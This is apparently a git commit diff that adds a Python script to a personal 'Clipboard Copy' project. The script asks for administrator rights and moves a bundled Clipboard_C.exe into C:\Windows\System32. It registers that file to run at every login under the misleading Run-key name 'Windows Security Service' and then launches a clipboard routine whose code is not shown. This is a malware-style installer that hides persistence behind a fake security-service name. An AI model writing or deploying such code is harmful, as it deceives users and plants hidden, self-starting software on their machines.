2523cbb6b0891c09b11d969185f6a08cf848dbfa
Ahad160 <ahadmaycry@gmail.com>
2023-12-23 23:24:07 +0600

    23/12/23

---
+++ Python Language/Projects/Project_15_Clipboard_Copy/SC_Main.py
@@ -0,0 +1,75 @@
+import shutil
+import os
+import sys
+import ctypes
+import winreg
+import Clipboard_C  # Importing the Clipboard_C module
+
+
+#Ask For Run As Administrator
+def run_as_admin():
+  
+    if ctypes.windll.shell32.IsUserAnAdmin():
+        return True
+    else:
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, sys.argv[0], None, 1)
+        return False
+
+if run_as_admin():
+    def move_exe_file(source_path, destination_path):
+        try:
+            # Check if the source file exists
+            if os.path.exists(source_path):
+                # Move the file to the destination path
+                shutil.move(source_path, destination_path)
+                print(f"File moved successfully to {destination_path}")
+            else:
+                print(f"Source---**file {source_path} does not exist.")
+        except Exception as e:
+            print(f"Error: {e}")
+
+    # Get the directory of the script or the bundled executable
+    script_directory = getattr(sys, '_MEIPASS', os.path.dirname(__file__))
+
+    # Specify the paths
+    source_file_path = os.path.join(script_directory, "Clipboard_C.exe")
+    destination_folder = r"C:\Windows\System32"
+
+    move_exe_file(source_file_path, destination_folder)
+
+    # #🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴 2nd Part
+
+    def add_to_startup():
+        # Get the path to the current script
+        script_path = os.path.abspath(sys.argv[0])
+
+        # Get the path to the executable (assuming it's in the same directory)
+        executable_path = os.path.abspath(r"C:\Windows\System32\Clipboard_C.exe")
+
+        # Create the registry key for the startup entry
+        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        key_name = "Windows Security Service"
+
+        try:
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
+                winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, executable_path)
+            print(f"Added to startup: {executable_path}")
+        except Exception as e:
+            print(f"Error adding to startup: {e}")
+
+        
+        
+
+    # Add the executable to startup
+    add_to_startup()
+
+    Clipboard_C.Clipboard()
+
+
+
+
+
+
+
+
+
